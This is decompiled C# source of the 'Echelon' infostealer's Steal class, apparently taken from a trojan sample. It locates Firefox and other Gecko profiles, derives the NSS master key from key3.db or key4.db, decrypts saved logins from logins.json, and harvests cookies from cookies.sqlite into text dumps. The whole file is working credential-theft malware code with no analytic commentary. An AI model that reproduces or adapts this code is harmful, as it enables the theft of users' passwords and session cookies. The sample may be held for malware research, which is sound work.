// Decompiled with JetBrains decompiler
// Type: Echelon.Steal
// Assembly: Echelon, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DAEC4C03-F667-4BBB-B546-ED8351172E13
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-PSW.MSIL.Coins.gen-d5a7c67747c1d8095b6fb6fef9f446b048a753bfda98e9cf19f265a6203e27cf.exe

using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

namespace Echelon
{
  internal class Steal
  {
    public static int count = 0;
    public static int count_cookies = 0;
    public static List<string> domains = new List<string>();
    public static List<string> Cookies_Gecko = new List<string>();
    public static List<string> passwors = new List<string>();
    public static List<string> credential = new List<string>();
    public static readonly string LocalAppData = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Local");
    public static readonly string TempDirectory = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Local\\Temp");
    public static readonly string RoamingAppData = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Roaming");
    public static readonly byte[] Key4MagicNumber = new byte[16]
    {
      (byte) 248,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 1
    };
    public static List<string> GeckoBrowsers = new List<string>();

    public static List<string> FindPaths(
      string baseDirectory,
      int maxLevel = 4,
      int level = 1,
      params string[] files)
    {
      List<string> paths = new List<string>();
      if (files != null && files.Length != 0)
      {
        if (level <= maxLevel)
        {
          try
          {
            foreach (string directory in Directory.GetDirectories(baseDirectory))
            {
              try
              {
                DirectoryInfo directoryInfo = new DirectoryInfo(directory);
                FileInfo[] files1 = directoryInfo.GetFiles();
                bool flag = false;
                for (int index1 = 0; index1 < files1.Length && !flag; ++index1)
                {
                  for (int index2 = 0; index2 < files.Length && !flag; ++index2)
                  {
                    string file = files[index2];
                    FileInfo fileInfo = files1[index1];
                    string name = fileInfo.Name;
                    if (file == name)
                    {
                      flag = true;
                      paths.Add(fileInfo.FullName);
                    }
                  }
                }
                foreach (string path in Steal.FindPaths(directoryInfo.FullName, maxLevel, level + 1, files))
                {
                  if (!paths.Contains(path))
                    paths.Add(path);
                }
              }
              catch
              {
              }
            }
            return paths;
          }
          catch
          {
            return paths;
          }
        }
      }
      return paths;
    }

    public static void Creds(string profile, string browser_name, string profile_name)
    {
      try
      {
        if (File.Exists(Path.Combine(profile, "key3.db")))
          Steal.Lopos(profile, Steal.p3k(Steal.CreateTempCopy(Path.Combine(profile, "key3.db"))), browser_name, profile_name);
        Steal.Lopos(profile, Steal.p4k(Steal.CreateTempCopy(Path.Combine(profile, "key4.db"))), browser_name, profile_name);
      }
      catch (Exception ex)
      {
      }
    }

    public static void Cookies()
    {
      List<string> stringList = new List<string>();
      stringList.AddRange((IEnumerable<string>) Steal.FindPaths(Steal.LocalAppData, 4, 1, "key3.db", "key4.db", "cookies.sqlite", "logins.json"));
      stringList.AddRange((IEnumerable<string>) Steal.FindPaths(Steal.RoamingAppData, 4, 1, "key3.db", "key4.db", "cookies.sqlite", "logins.json"));
      foreach (string fileName in stringList)
      {
        string fullName = new FileInfo(fileName).Directory.FullName;
        string browser_name = fileName.Contains(Steal.RoamingAppData) ? Steal.prbn(fullName) : Steal.plbn(fullName);
        string name = Steal.GetName(fullName);
        Steal.CookMhn(fullName, browser_name, name);
        string contents = "";
        foreach (string str in Steal.Cookies_Gecko)
          contents += str;
        if (contents != "")
          File.WriteAllText(Help.Cookies + "\\Cookies_Mozilla.txt", contents, Encoding.Default);
      }
    }

    public static void Passwords()
    {
      List<string> stringList = new List<string>();
      stringList.AddRange((IEnumerable<string>) Steal.FindPaths(Steal.LocalAppData, 4, 1, "key3.db", "key4.db", "cookies.sqlite", "logins.json"));
      stringList.AddRange((IEnumerable<string>) Steal.FindPaths(Steal.RoamingAppData, 4, 1, "key3.db", "key4.db", "cookies.sqlite", "logins.json"));
      foreach (string fileName in stringList)
      {
        string fullName = new FileInfo(fileName).Directory.FullName;
        string browser_name = fileName.Contains(Steal.RoamingAppData) ? Steal.prbn(fullName) : Steal.plbn(fullName);
        string name = Steal.GetName(fullName);
        Steal.Creds(fullName, browser_name, name);
        string contents = "";
        foreach (string geckoBrowser in Steal.GeckoBrowsers)
          contents = contents + geckoBrowser + Environment.NewLine;
        if (contents != "")
          File.WriteAllText(Help.Passwords + "\\Passwords_Mozilla.txt", contents, Encoding.Default);
      }
    }

    private static string GetName(string path)
    {
      try
      {
        string[] strArray = path.Split(new char[1]{ '\\' }, StringSplitOptions.RemoveEmptyEntries);
        return strArray[strArray.Length - 1];
      }
      catch
      {
      }
      return "Unknown";
    }

    public static string CreateTempCopy(string filePath)
    {
      string tempPath = Steal.CreateTempPath();
      File.Copy(filePath, tempPath, true);
      return tempPath;
    }

    public static string CreateTempPath()
    {
      string tempDirectory = Steal.TempDirectory;
      string str1 = DateTime.Now.ToString("O").Replace(':', '_');
      int num = Thread.CurrentThread.GetHashCode();
      string str2 = num.ToString();
      num = Thread.CurrentThread.ManagedThreadId;
      string str3 = num.ToString();
      string path2 = "tempDataBase" + str1 + str2 + str3;
      return Path.Combine(tempDirectory, path2);
    }

    public static void CookMhn(string profile, string browser_name, string profile_name)
    {
      try
      {
        CNT cnt = new CNT(Steal.CreateTempCopy(Path.Combine(profile, "cookies.sqlite")));
        cnt.ReadTable("moz_cookies");
        for (int rowIndex = 0; rowIndex < cnt.RowLength; ++rowIndex)
        {
          try
          {
            Steal.domains.Add(cnt.ParseValue(rowIndex, "host").Trim());
            List<string> cookiesGecko = Steal.Cookies_Gecko;
            string[] strArray = new string[14];
            strArray[0] = cnt.ParseValue(rowIndex, "host").Trim();
            strArray[1] = "\t";
            bool flag = cnt.ParseValue(rowIndex, "isSecure") == "1";
            strArray[2] = flag.ToString();
            strArray[3] = "\t";
            strArray[4] = cnt.ParseValue(rowIndex, "path").Trim();
            strArray[5] = "\t";
            flag = cnt.ParseValue(rowIndex, "isSecure") == "1";
            strArray[6] = flag.ToString();
            strArray[7] = "\t";
            strArray[8] = cnt.ParseValue(rowIndex, "expiry").Trim();
            strArray[9] = "\t";
            strArray[10] = cnt.ParseValue(rowIndex, "name").Trim();
            strArray[11] = "\t";
            strArray[12] = cnt.ParseValue(rowIndex, "value");
            strArray[13] = Environment.NewLine;
            string str = string.Concat(strArray);
            cookiesGecko.Add(str);
          }
          catch
          {
          }
        }
      }
      catch (Exception ex)
      {
      }
    }

    public static void Lopos(
      string profile,
      byte[] privateKey,
      string browser_name,
      string profile_name)
    {
      try
      {
        string tempCopy = Steal.CreateTempCopy(Path.Combine(profile, "logins.json"));
        if (!File.Exists(tempCopy))
          return;
        foreach (JsonValue jsonValue in (IEnumerable) File.ReadAllText(tempCopy).FromJSON()["logins"])
        {
          Gecko4 gecko4_1 = Gecko1.Create(Convert.FromBase64String(jsonValue["encryptedUsername"].ToString(false)));
          Gecko4 gecko4_2 = Gecko1.Create(Convert.FromBase64String(jsonValue["encryptedPassword"].ToString(false)));
          string str1 = Regex.Replace(Gecko6.lTRjlt(privateKey, gecko4_1.Objects[0].Objects[1].Objects[1].ObjectData, gecko4_1.Objects[0].Objects[2].ObjectData, PaddingMode.PKCS7), "[^\\u0020-\\u007F]", string.Empty);
          string str2 = Regex.Replace(Gecko6.lTRjlt(privateKey, gecko4_2.Objects[0].Objects[1].Objects[1].ObjectData, gecko4_2.Objects[0].Objects[2].ObjectData, PaddingMode.PKCS7), "[^\\u0020-\\u007F]", string.Empty);
          Steal.credential.Add("URL : " + (string) jsonValue["hostname"] + Environment.NewLine + "Login: " + str1 + Environment.NewLine + "Password: " + str2 + Environment.NewLine);
          Steal.GeckoBrowsers.Add("URL : " + (string) jsonValue["hostname"] + Environment.NewLine + "Login: " + str1 + Environment.NewLine + "Password: " + str2 + Environment.NewLine);
          ++Steal.count;
        }
        for (int index = 0; index < Steal.credential.Count<string>(); ++index)
          Steal.GeckoBrowsers.Add("Browser : " + browser_name + Environment.NewLine + "Profile : " + profile_name + Environment.NewLine + Steal.credential[index]);
        Steal.credential.Clear();
      }
      catch (Exception ex)
      {
      }
    }

    private static byte[] p4k(string file)
    {
      byte[] numArray = new byte[24];
      try
      {
        if (!File.Exists(file))
          return numArray;
        CNT cnt = new CNT(file);
        cnt.ReadTable("metaData");
        string s = cnt.ParseValue(0, "item1");
        Gecko4 gecko4_1 = Gecko1.Create(Encoding.Default.GetBytes(cnt.ParseValue(0, "item2)")));
        byte[] objectData1 = gecko4_1.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData;
        byte[] objectData2 = gecko4_1.Objects[0].Objects[1].ObjectData;
        Gecko8 gecko8_1 = new Gecko8(Encoding.Default.GetBytes(s), Encoding.Default.GetBytes(string.Empty), objectData1);
        gecko8_1.го7па();
        Gecko6.lTRjlt(gecko8_1.DataKey, gecko8_1.DataIV, objectData2);
        cnt.ReadTable("nssPrivate");
        int rowLength = cnt.RowLength;
        string empty = string.Empty;
        for (int rowIndex = 0; rowIndex < rowLength; ++rowIndex)
        {
          if (cnt.ParseValue(rowIndex, "a102") == Encoding.Default.GetString(Steal.Key4MagicNumber))
          {
            empty = cnt.ParseValue(rowIndex, "a11");
            break;
          }
        }
        Gecko4 gecko4_2 = Gecko1.Create(Encoding.Default.GetBytes(empty));
        byte[] objectData3 = gecko4_2.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData;
        byte[] objectData4 = gecko4_2.Objects[0].Objects[1].ObjectData;
        Gecko8 gecko8_2 = new Gecko8(Encoding.Default.GetBytes(s), Encoding.Default.GetBytes(string.Empty), objectData3);
        gecko8_2.го7па();
        return Encoding.Default.GetBytes(Gecko6.lTRjlt(gecko8_2.DataKey, gecko8_2.DataIV, objectData4, PaddingMode.PKCS7));
      }
      catch (Exception ex)
      {
        return numArray;
      }
    }

    private static byte[] p3k(string file)
    {
      byte[] destinationArray = new byte[24];
      try
      {
        if (!File.Exists(file))
          return destinationArray;
        DataTable dataTable = new DataTable();
        Gecko9 berkeleyDB = new Gecko9(file);
        Gecko7 gecko7 = new Gecko7(Steal.vbv(berkeleyDB, (Func<string, bool>) (x => x.Equals("password-check"))));
        string hexString = Steal.vbv(berkeleyDB, (Func<string, bool>) (x => x.Equals("global-salt")));
        Gecko8 gecko8_1 = new Gecko8(Steal.ConvertHexStringToByteArray(hexString), Encoding.Default.GetBytes(string.Empty), Steal.ConvertHexStringToByteArray(gecko7.EntrySalt));
        gecko8_1.го7па();
        Gecko6.lTRjlt(gecko8_1.DataKey, gecko8_1.DataIV, Steal.ConvertHexStringToByteArray(gecko7.Passwordcheck));
        Gecko4 gecko4_1 = Gecko1.Create(Steal.ConvertHexStringToByteArray(Steal.vbv(berkeleyDB, (Func<string, bool>) (x => !x.Equals("password-check") && !x.Equals("Version") && !x.Equals("global-salt")))));
        Gecko8 gecko8_2 = new Gecko8(Steal.ConvertHexStringToByteArray(hexString), Encoding.Default.GetBytes(string.Empty), gecko4_1.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData);
        gecko8_2.го7па();
        Gecko4 gecko4_2 = Gecko1.Create(Gecko1.Create(Encoding.Default.GetBytes(Gecko6.lTRjlt(gecko8_2.DataKey, gecko8_2.DataIV, gecko4_1.Objects[0].Objects[1].ObjectData))).Objects[0].Objects[2].ObjectData);
        if (gecko4_2.Objects[0].Objects[3].ObjectData.Length <= 24)
          return gecko4_2.Objects[0].Objects[3].ObjectData;
        Array.Copy((Array) gecko4_2.Objects[0].Objects[3].ObjectData, gecko4_2.Objects[0].Objects[3].ObjectData.Length - 24, (Array) destinationArray, 0, 24);
        return destinationArray;
      }
      catch (Exception ex)
      {
        return destinationArray;
      }
    }

    public static byte[] ConvertHexStringToByteArray(string hexString)
    {
      byte[] byteArray = hexString.Length % 2 == 0 ? new byte[hexString.Length / 2] : throw new ArgumentException(string.Format((IFormatProvider) CultureInfo.InvariantCulture, "The binary key cannot have an odd number of digits: {0}", (object) hexString));
      for (int index = 0; index < byteArray.Length; ++index)
      {
        string s = hexString.Substring(index * 2, 2);
        byteArray[index] = byte.Parse(s, NumberStyles.HexNumber, (IFormatProvider) CultureInfo.InvariantCulture);
      }
      return byteArray;
    }

    private static string vbv(Gecko9 berkeleyDB, Func<string, bool> predicate)
    {
      string empty = string.Empty;
      try
      {
        foreach (KeyValuePair<string, string> key in berkeleyDB.Keys)
        {
          if (predicate(key.Key))
            empty = key.Value;
        }
      }
      catch (Exception ex)
      {
      }
      return empty.Replace("-", string.Empty);
    }

    private static string prbn(string profilesDirectory)
    {
      string str = string.Empty;
      try
      {
        string[] strArray = profilesDirectory.Split(new string[1]
        {
          "AppData\\Roaming\\"
        }, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1]
        {
          '\\'
        }, StringSplitOptions.RemoveEmptyEntries);
        str = !(strArray[2] == "Profiles") ? strArray[0] : strArray[1];
      }
      catch (Exception ex)
      {
      }
      return str.Replace(" ", string.Empty);
    }

    private static string plbn(string profilesDirectory)
    {
      string str = string.Empty;
      try
      {
        string[] strArray = profilesDirectory.Split(new string[1]
        {
          "AppData\\Local\\"
        }, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1]
        {
          '\\'
        }, StringSplitOptions.RemoveEmptyEntries);
        str = !(strArray[2] == "Profiles") ? strArray[0] : strArray[1];
      }
      catch (Exception ex)
      {
      }
      return str.Replace(" ", string.Empty);
    }
  }
}
